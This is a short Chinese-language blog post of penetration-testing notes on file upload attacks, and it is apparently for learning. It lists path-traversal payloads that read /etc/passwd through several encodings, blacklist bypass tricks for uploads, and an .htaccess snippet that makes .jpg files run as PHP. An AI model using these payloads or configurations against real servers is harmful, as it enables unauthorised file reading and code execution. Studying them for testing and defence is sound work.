---
title: 【文件上传】文件上传总结
comments: true
categories:
  - 渗透测试
  - 文件上传
tags:
  - 文件上传
description: 记录文件上传渗透测试思路
abbrlink: 3cec027e
date: 2025-07-21 12:56:12
top:
---

## 目录遍历

```
# 相对路径遍历
https://insecure-website.com/loadImage?filename=../../../etc/passwd

# 绝对路径遍历
https://insecure-website.com/loadImage?filename=/etc/passwd

# 嵌套遍历
https://insecure-website.com/loadImage?filename=....//....//....//etc//passwd
https://insecure-website.com/loadImage?filename=....//....//....//etc//passwd

# URL编码遍历
# 单层相对
filename=%2e%2e%2fetc%2fpasswd
# 双层相对
filename=%252e%252e%252fetc%2fpasswd
# 双层相对
filename=.%%32%65/.%%32%65/.%%32%65/etc/passwd
# 从预期基本文件夹开始
filename=/var/www/images/...%2f...%2f...%2fetc/passwd
# 空字节截断
filename=.../.../.../etc/passwd%00.png
```

## Windows文件上传绕过

- 黑名单绕过：
  - 大小写
  
  - 不常见脚本的后缀
  
  - 末尾加点（限Windows）
  
  - 末尾加 `::$DATA` 字符串（限Windows）

  - 加空格（限Windows）
  
  - 双写
  
  - GET和POST `%00` 截断
  
  - 配置文件修改 `.htaccess`
  
    ```
    AddHandler php5-script .jpg
     
    AddType application/x-httpd-php .jpg
     
    Sethandler application/x-httpd-php
    ```
  
    
  
  



## 入门

前端限制后缀

后端验证content-type

图片添加php语句，直接使用添加了php语句的图片，拦截包后修改，直接传，比较方便。能直接绕过前端。





## 进阶



